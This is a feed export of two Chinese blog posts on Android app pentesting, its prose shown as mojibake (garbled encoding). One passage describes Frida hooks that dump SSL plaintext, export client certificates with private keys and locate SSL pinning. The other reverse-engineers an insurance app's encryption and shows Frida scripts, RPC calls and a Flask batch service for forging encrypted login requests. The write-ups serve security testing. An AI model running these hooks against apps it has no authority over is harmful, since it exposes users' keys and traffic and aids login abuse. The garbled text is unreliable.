¹æ®sslå¯¹è±¡ç”Ÿæˆå”¯ä¸€äº†hexå­—ç¬¦ä¸²ä»¥ä»£è¡¨è¯¥sslå¯¹è±¡ã€‚ä¸ºä»€ä¹ˆè¦æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿å‘¢ï¼Ÿæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœappä¸­å»ºç«‹äº†å¤šä¸ªä¿¡é“è¿›è¡Œsslé€šä¿¡ï¼Œç„¶ååŒæ—¶hookåˆ°äº†å¤§é‡çš„æŠ¥æ–‡ï¼Œé‚£å¦‚ä½•å°†è¿™äº›æŠ¥æ–‡åŒºåˆ†å¼€æ¥ï¼Ÿåˆ™æ˜¯é€šè¿‡è¯¥idåŒºåˆ†ä¸åŒsslé€šä¿¡ä¿¡é“ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨wiresharkæ—¶ï¼Œä½¿ç”¨follow tcp(http) streamæ—¶ï¼Œä¸€ä¸ªstreamä¸‹çš„æ‰€æœ‰æ”¶å‘æŠ¥æ–‡éƒ½æ˜¯ç”¨ä¸€ä¸ªsession_idã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410241103524.png" alt="image-20241024110354488"> </p><h3 id="Interceptor-attach-addresses-â€œSSL-readâ€"><a href="#Interceptor-attach-addresses-â€œSSL-readâ€" class="headerlink" title="Interceptor.attach(addresses[â€œSSL_readâ€]"></a>Interceptor.attach(addresses[â€œSSL_readâ€]</h3><p>é€šè¿‡hook <a href="http://aospxref.com/android-8.1.0_r81/xref/external/conscrypt/common/src/main/java/org/conscrypt/NativeCrypto.java">http://aospxref.com/android-8.1.0_r81/xref/external/conscrypt/common/src/main/java/org/conscrypt/NativeCrypto.java</a><br>çš„ native æ–¹æ³• SSL_read SSL_write, ä½¿æµé‡è¿›å…¥SSLå±‚æ—¶å¯¹æ•°æ®è¿›è¡Œdump</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250915270.png" alt="image-20241025091520178">  </p><p>æ¥ä¸‹æ¥åˆ™æ˜¯çœŸæ­£å®ç°hookçš„ä»£ç ã€‚ä¸Šè¿°ä»£ç å®ç°äº†å¯¹SSL_readçš„hookï¼Œè¯¥å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250922425.webp" alt="å›¾ç‰‡"> </p><p>ä¸€æ—¦è¯¥å‡½æ•°è¢«è°ƒç”¨ï¼Œè§¦å‘onEnterï¼Œç¨‹åºä¼šå°†sslå¯¹è±¡åŠç›¸å…³session_idå’Œsrc,deståœ°å€åŠå‚æ•°2ä¸­çš„bufæŒ‡é’ˆä¿å­˜èµ·æ¥ã€‚åœ¨å‡½æ•°æ‰§è¡Œå®Œæˆåè§¦å‘onLeaveï¼Œè¿™æ—¶appå·²ç»å®Œæˆäº†æ¶ˆæ¯æ¥æ”¶ï¼Œbufä¸­å·²ç»æ‹¿åˆ°æ˜æ–‡ä¿¡æ¯ï¼Œç¨‹åºæ ¹æ®è¿”å›å€¼å¾—åˆ°æ¥æ”¶çš„åŒ…ä½“å¤§å°ï¼Œå¹¶å°†ä¹‹å‰ä¿å­˜çš„ç›¸å…³ä¿¡æ¯ä¸€å¹¶ï¼Œé€šè¿‡sendå‘å›åˆ°on_messageå›è°ƒå‡½æ•°ï¼Œon_messageå›æ ¹æ®å‘å›çš„æ¶ˆæ¯è¿›è¡Œå¤„ç†å’Œä¿å­˜ã€‚è¿™æ ·å°±å®Œæˆäº†æ”¶æ¶ˆæ¯çš„æ•è·å’Œä¿å­˜ã€‚</p><h3 id="Interceptor-attach-addresses-â€œSSL-writeâ€"><a href="#Interceptor-attach-addresses-â€œSSL-writeâ€" class="headerlink" title="Interceptor.attach(addresses[â€œSSL_writeâ€]"></a>Interceptor.attach(addresses[â€œSSL_writeâ€]</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250925149.png" alt="image-20241025092521115"> </p><p>SSL_writeå‡½æ•°åŸå‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250924275.webp" alt="å›¾ç‰‡"> </p><p>å‘æ¶ˆæ¯çš„hookæ›´ç®€å•ï¼Œä¸ç”¨ç­‰åˆ°å‡½æ•°æ‰§è¡Œå®Œï¼Œåœ¨SSL_writeå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œè§¦å‘onEnterï¼Œç¨‹åºå¼€å§‹ä¿å­˜sslç›¸å…³ä¿¡æ¯åŠå‘é€çš„bufä¿¡æ¯ï¼Œä¸€å¹¶å‘å›åˆ°on_messageå¤„ç†ã€‚</p><h3 id="å®¢æˆ·ç«¯è¯ä¹¦å¯¼å‡º"><a href="#å®¢æˆ·ç«¯è¯ä¹¦å¯¼å‡º" class="headerlink" title="å®¢æˆ·ç«¯è¯ä¹¦å¯¼å‡º"></a>å®¢æˆ·ç«¯è¯ä¹¦å¯¼å‡º</h3><p>hookäº†java.security.KeyStore$PrivateKeyEntryçš„getPrivateKeyå‡½æ•°å’ŒgetCertificateChainå‡½æ•°ï¼Œåœ¨ä»–ä»¬è¢«è°ƒç”¨æ—¶é€šè¿‡æ‰§è¡ŒgetPrivateKeyå’ŒgetCertificateå‡½æ•°æ‹¿åˆ°ç§é’¥å’Œè¯ä¹¦å¯¹è±¡ï¼Œå®ç°å°†å®¢æˆ·ç«¯è¯ä¹¦å¯¼å‡ºä¿å­˜çš„åŠŸèƒ½ã€‚é»˜è®¤ä¿å­˜çš„è·¯å¾„åœ¨&#x2F;sdcard&#x2F;Download&#x2F;+åŒ…å+éšæœºå­—ç¬¦ä¸².p12çš„ä½ç½®ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250929423.png" alt="image-20241025092947370"> </p><h3 id="SSLpinning-helper"><a href="#SSLpinning-helper" class="headerlink" title="SSLpinning helper"></a>SSLpinning helper</h3><p>æ¥ä¸‹æ¥æ˜¯è¾…åŠ©åˆ†æssl pinningä½ç½®çš„ä»£ç ï¼Œå¦‚æœä¸€æ—¦ç¨‹åºåŠ è½½è¯ä¹¦æ–‡ä»¶åˆ™ä¼šè¢«è¯¥æ®µä»£ç æ•è·ï¼Œå¹¶ä¸»åŠ¨æŸ¥è¯¢å †æ ˆæ˜¯å¦å­˜åœ¨å…³é”®è¯checkServerTrustedï¼Œå¦‚æœå­˜åœ¨åˆ™å¾ˆå¯èƒ½æ˜¯è¯ä¹¦ç»‘å®šçš„ç›¸å…³ä»£ç ï¼Œæ­¤æ—¶å‘é€å †æ ˆä¿¡æ¯åˆ°å¤–éƒ¨ï¼Œä¾¿äºå®šä½ã€‚</p><p>è€ƒè™‘åˆ°Appåœ¨éªŒè¯è¯ä¹¦æ—¶ä¼šæ‰“å¼€è¯ä¹¦æ–‡ä»¶åˆ¤æ–­æ˜¯å¦æ˜¯Appè‡ªèº«æ‰€ä¿¡ä»»çš„ï¼Œå› æ­¤ä¸€å®šä¼šä½¿ç”¨Fileç±»çš„æ„é€ å‡½æ•°æ‰“å¼€è¯ä¹¦æ–‡ä»¶è·å¾—æ–‡ä»¶çš„å¥æŸ„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æµ‹è¯•æ—¶å¯ä»¥Hookä¸Šæ‰€æœ‰Fileç±»çš„æ„é€ å‡½æ•°ï¼Œå³å¯¹<strong>File.initå‡½æ•°è¿›è¡Œhookã€‚</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250930243.png" alt="image-20241025093040207"> </p><h3 id="Httpè¯·æ±‚-å“åº”æ•è·"><a href="#Httpè¯·æ±‚-å“åº”æ•è·" class="headerlink" title="Httpè¯·æ±‚&amp;å“åº”æ•è·"></a>Httpè¯·æ±‚&amp;å“åº”æ•è·</h3><p>æ¥ä¸‹æ¥å®ç°çš„ä¸¤ä¸ªhookåˆ™æ˜¯åœ¨javaå±‚å®Œæˆäº†å¯¹socketWrite0å’ŒsocketRead0çš„hookï¼Œè¿™ä¿©å‡½æ•°æ˜¯å®‰å“ç«¯ésslåŠ å¯†çš„æ­£å¸¸socketé€šä¿¡çš„æ”¶å‘å‡½æ•°ã€‚è‡³æ­¤ä¹Ÿå®Œæˆäº†å¯¹éåŠ å¯†çš„æŠ¥æ–‡çš„æ•è·ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250945972.png" alt="image-20241025094530920"> </p><h3 id="å †æ ˆæ‰“å°"><a href="#å †æ ˆæ‰“å°" class="headerlink" title="å †æ ˆæ‰“å°"></a>å †æ ˆæ‰“å°</h3><p>æœ€åè¿™ä¸€æ®µï¼Œæ˜¯ä¸ºäº†æ”¯æŒå¯¹ssl_readå’Œssl_writeçš„å †æ ˆä¿¡æ¯æ‰“å°å•ç‹¬å†™çš„hookã€‚å› ä¸ºåœ¨soå±‚å·²ç»æ‹¿ä¸åˆ°javaå±‚çš„å †æ ˆä¿¡æ¯äº†ï¼Œæ‰€ä»¥æ­¤å¤„hookäº†javaå±‚çš„writeå’Œreadå‡½æ•°ï¼ˆè¿™å…¶å®ä¹Ÿå°±æ˜¯libssl.soå¯¼å‡ºå‡½æ•°åœ¨javaå±‚çš„è°ƒç”¨å‡½æ•°ï¼‰ï¼Œè™½ç„¶æ­¤å¤„ä¸€éƒ¨åˆ†åœ¨å¤–éƒ¨ä¸€éƒ¨åˆ†åœ¨å†…éƒ¨ç•¥æ˜¾ä¸ä¼˜é›…ï¼Œä½†æ˜¯åœ¨è¾…åŠ©æˆ‘ä»¬åˆ†æå‘åŒ…ä½ç½®æˆ–æŠ¥æ–‡æ„å»ºæ—¶è¿˜æ˜¯å¾ˆæœ‰è£¨ç›Šçš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410250946162.png" alt="image-20241025094648117"> </p><h1 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h1><p><a href="https://mp.weixin.qq.com/s/lMV1UZYOaSRJjMa8PNFkow">https://mp.weixin.qq.com/s/lMV1UZYOaSRJjMa8PNFkow</a></p><p><a href="https://mp.weixin.qq.com/s/A5snvJAxQQBUJ6ZTTkHgCA">https://mp.weixin.qq.com/s/A5snvJAxQQBUJ6ZTTkHgCA</a></p><p><a href="https://www.cnblogs.com/gradyblog/p/17320025.html">https://www.cnblogs.com/gradyblog/p/17320025.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R0capture </tag>
            
            <tag> Rpc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸä¿é™©APPåŠ è§£å¯†ç®—æ³•é€†å‘</title>
      <link href="/2024/10/10/%E6%9F%90%E4%BF%9D%E9%99%A9APP%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/"/>
      <url>/2024/10/10/%E6%9F%90%E4%BF%9D%E9%99%A9APP%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬èŠ‚åˆ†æçš„æ˜¯ä¹‹å‰æ¸—é€æ—¶çš„ä¸€ä¸ªAPPï¼ŒæŠ“åŒ…åå‘ç°è¯·æ±‚åŒ…å’Œè¿”å›åŒ…éƒ½åšäº†åŠ å¯†ã€‚</p><p>æ­¤å¤„åˆ†ææŸä¿é™©çš„APPï¼Œå…·ä½“åˆ†ææƒ…å†µå¦‚ä¸‹ï¼š</p><p>å¼€æ•´å¼€æ•´å¼€æ•´~</p><h1 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h1><p>ç›®æ ‡æ¥å£ï¼š<a href="https://xxx.xxx.xxx/login.do">https://xxx.xxx.xxx/login.do</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121243.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121584.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121447.png" alt="image.png"> </p><p>å‘ç°è¯·æ±‚åŒ…å’Œå“åº”åŒ…çš„å†…å®¹éƒ½æ˜¯ç›´æ¥åŠ å¯†çš„ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆæç¤ºä¿¡æ¯ï¼Œä»€ä¹ˆç©æ„ï¼Ÿï¼Ÿï¼Ÿ</p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>1ã€é¦–å…ˆï¼ŒæŸ¥å£³ï¼Œæœªå‘ç°å£³</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121121201.png" alt="image.png"> </p><p>2ã€å°†apkæ‹–å…¥åˆ°jadxä¸­ï¼Œæœç´¢ä¸€äº›å…³é”®å­—ç¬¦ã€‚å¦‚â€encryptâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121122575.png" alt="image.png"> </p><p>å‘ç°åœ¨<code>com.xxxx.core_library.util.encrypt</code>è¿™ä¸ªpackageä¸‹ï¼Œæœ‰AESå’ŒRSAçš„åŠ å¯†ç®—æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121122490.png" alt="image.png"> </p><p>æŸ¥çœ‹ç›¸å…³ä»£ç åå‘ç°ï¼Œç–‘ä¼¼çš„å…³é”®ä»£ç æ˜¯åœ¨<code>AESUtil</code>å’Œ <code>RSAUtils</code>è¿™ä¸¤ä¸ªç±»ä¸­çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121122103.png" alt="image.png"> </p><p>ä½†å…·ä½“åŠ å¯†é€»è¾‘æ˜¯ä»€ä¹ˆæš‚æ—¶ä¸æ¸…æ¥šã€‚</p><p>3ã€è¿™æ—¶å€™ï¼Œå¯ä»¥ç”¨hookçš„ç¥å™¨<code>objection</code>æ¥å¯¹è¿™ä¸¤ä¸ªç±»ä¸‹çš„æ‰€æœ‰æ–¹æ³•hookï¼ŒæŸ¥çœ‹å…¶åŠ è§£å¯†é€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class com.xxx.core_library.util.encrypt.AESUtil</span><br><span class="line">android hooking watch class com.xxx.core_library.util.encrypt.RSAUtils</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121123770.png" alt="image-20241012112328744"> </p><p>4ã€ç‚¹å‡»ç™»å½•ï¼ŒæŠ“åŒ…ï¼ŒæŸ¥çœ‹hookæƒ…å†µï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121123594.png" alt="image.png"> </p><p>æ•´ç†ä¸€ä¸‹ï¼Œè°ƒç”¨çš„å‡½æ•°æœ‰ï¼ˆæŒ‰ç…§è°ƒç”¨é¡ºåºå¦‚ä¸‹ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AESUtil.encrypt(java.lang.String)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">AESUtil.decrypt([B)</span><br><span class="line">AESUtil.makeKey(java.lang.String)</span><br><span class="line">AESUtil.makeIv()</span><br><span class="line">RSAUtils.actRsaPubkeyEncry(java.lang.String)</span><br><span class="line">RSAUtils.decryptByPublicKey([B, java.lang.String)</span><br><span class="line">RSAUtils.Base64Decode(java.lang.String)</span><br><span class="line">AESUtil.decrypt([B, java.lang.String)</span><br><span class="line">AESUtil.makeKey(java.lang.String)    </span><br><span class="line">AESUtil.makeIv()</span><br></pre></td></tr></table></figure><p>æ•´ç†å»é‡åï¼Œä¸»è¦æ˜¯æœ‰ä»¥ä¸‹å‡ ä¸ªå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AESUtil.encrypt</span><br><span class="line">AESUtil.makeKey</span><br><span class="line">AESUtil.makeIv</span><br><span class="line">AESUtil.decrypt</span><br><span class="line">RSAUtils.actRsaPubkeyEncry</span><br><span class="line">RSAUtils.decryptByPublicKey</span><br><span class="line">RSAUtils.Base64Decode</span><br><span class="line">RSAUtils.actResPubkeyDes</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹åŠ å¯†ï¼Œæ ¹æ®å‡½æ•°åï¼Œå¯ä»¥çœ‹åˆ°é‡è¦çš„å‡½æ•°èµ·å§‹å°±å€¼æœ‰2ä¸ª<code>AESUtil.encrypt</code>å’Œ <code>RSAUtils.actRsaPubkeyEncry</code></p><p>5ã€hookè¿™ä¸¤ä¸ªå…³é”®å‡½æ•°ï¼ˆè¿™å—ä¸ç”¨å…³æ³¨é‡è½½çš„æƒ…å†µï¼Œå› ä¸ºObjectioné»˜è®¤hookä¸€ä¸ªå‡½æ•°æ˜¯hookè¯¥å‡½æ•°çš„æ‰€æœ‰é‡è½½çš„ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.xxx.core_library.util.encrypt.AESUtil.encrypt --dump-args --dump-return --dump-backtrace</span><br><span class="line">android hooking watch class_method com.xxx.core_library.util.encrypt.RSAUtils.actRsaPubkeyEncry --dump-args --dump-return --dump-backtrace </span><br></pre></td></tr></table></figure><p>å¯¹æ¯”æŠ“åŒ…è·å–çš„å¯†æ–‡å†…å®¹ï¼Œå¯ä»¥æˆåŠŸå®šä½åˆ°å…·ä½“çš„åŠ å¯†å‡½æ•°<code>RSAUtils.actRsaPubkeyEncry</code>ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121125089.png" alt="image-20241012112515001"> </p><p>åŒç†ï¼Œåˆ©ç”¨å¦‚ä¸Šæ–¹æ³•ï¼Œå¯ä»¥å®šä½åˆ°å…·ä½“è§£å¯†å‡½æ•°ä¸º <code>RSAUtils.actResPubkeyDes</code>:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121125573.png" alt="image-20241012112545525"> </p><p>6ã€Fridaç¼–å†™è„šæœ¬hookè¿™ä¸¤ä¸ªå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStack</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = <span class="title class_">Exception</span>.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.<span class="title function_">replace</span>(<span class="regexp">/,/g</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(replaceStr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            <span class="title class_">Exception</span>.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> claz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xxxx.core_library.util.encrypt.RSAUtils&#x27;</span>);</span><br><span class="line">        <span class="comment">//åŠ å¯†å‡½æ•°</span></span><br><span class="line">        claz.<span class="property">actRsaPubkeyEncry</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&#x27;actRsaPubkeyEncry&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actRsaPubkeyEncry input: &quot;</span> + str);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">actRsaPubkeyEncry</span>(str);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actRsaPubkeyEncry result: &quot;</span> + result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line">        claz.<span class="property">actResPubkeyDes</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&#x27;actResPubkeyDes&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actResPubkeyDes input: &quot;</span> + str);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">actResPubkeyDes</span>(str);</span><br><span class="line">            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;actResPubkeyDes result: &quot;</span> + result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121126659.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121126147.png" alt="image.png"> </p><h1 id="æ•´ç†"><a href="#æ•´ç†" class="headerlink" title="æ•´ç†"></a>æ•´ç†</h1><h2 id="ä¸»åŠ¨è°ƒç”¨"><a href="#ä¸»åŠ¨è°ƒç”¨" class="headerlink" title="ä¸»åŠ¨è°ƒç”¨"></a>ä¸»åŠ¨è°ƒç”¨</h2><p>JSä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åŠ å¯†</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> claz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xxx.core_library.util.encrypt.RSAUtils&#x27;</span>);</span><br><span class="line">        result = claz.<span class="title function_">actRsaPubkeyEncry</span>(data)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è§£å¯†</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> claz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xxxx.core_library.util.encrypt.RSAUtils&#x27;</span>);</span><br><span class="line">        result = claz.<span class="title function_">actResPubkeyDes</span>(data)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¼å‡ºæ¥å£</span></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">encrypt</span>: encrypt,</span><br><span class="line">    <span class="attr">decrypt</span>: decrypt</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121126848.png" alt="img"> </p><p>Pythonå®ç°ä¸»åŠ¨è°ƒç”¨ï¼š</p><p>Pythonå®ç°ä¸»åŠ¨è°ƒç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] ==<span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡†å¤‡å·¥ä½œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰çº¿è¿æ¥</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;127.0.0.1:27042&quot;</span>)</span><br><span class="line">pid = device.spawn(<span class="string">&#x27;com.xxx.xxxx&#x27;</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½JSè„šæœ¬</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rpc.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½è„šæœ¬å¹¶å®šä¹‰æ¶ˆæ¯å¤„ç†å‡½æ•°</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨å¯ä»¥é€šè¿‡ RPC è°ƒç”¨å®šä¹‰çš„å‡½æ•°</span></span><br><span class="line">result = script.exports.encrypt(<span class="string">&#x27;&#123;&quot;clientId&quot;:&quot;65l2f2f0an526tc&quot;,&quot;imgCode&quot;:&quot;1234&quot;,&quot;model&quot;:&quot;SM-G988N&quot;,&quot;password&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;phone&quot;:&quot;13888888888&quot;,&quot;phoneId&quot;:&quot;08:00:27:51:bf:b2&quot;,&quot;runEnvironment&quot;:&quot;2&quot;,&quot;system&quot;:&quot;android&quot;,&quot;systemversion&quot;:&quot;9&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121127532.png" alt="img"></p><h2 id="æ‰¹é‡RPC"><a href="#æ‰¹é‡RPC" class="headerlink" title="æ‰¹é‡RPC"></a>æ‰¹é‡RPC</h2><p>åŸºäºflaskï¼Œåˆ›å»ºå¯¹å¤–æ¥å£ï¼Œå®ç°POSTä¼ å‚è°ƒç”¨æ¥å£ï¼Œæœ€åå®ç°æ‰¹é‡åŒ–ä¸»åŠ¨è°ƒç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] ==<span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡†å¤‡å·¥ä½œ</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;127.0.0.1:27042&quot;</span>)</span><br><span class="line">pid = device.spawn(<span class="string">&#x27;com.xxx.xxx&#x27;</span>)</span><br><span class="line">device.resume(pid)</span><br><span 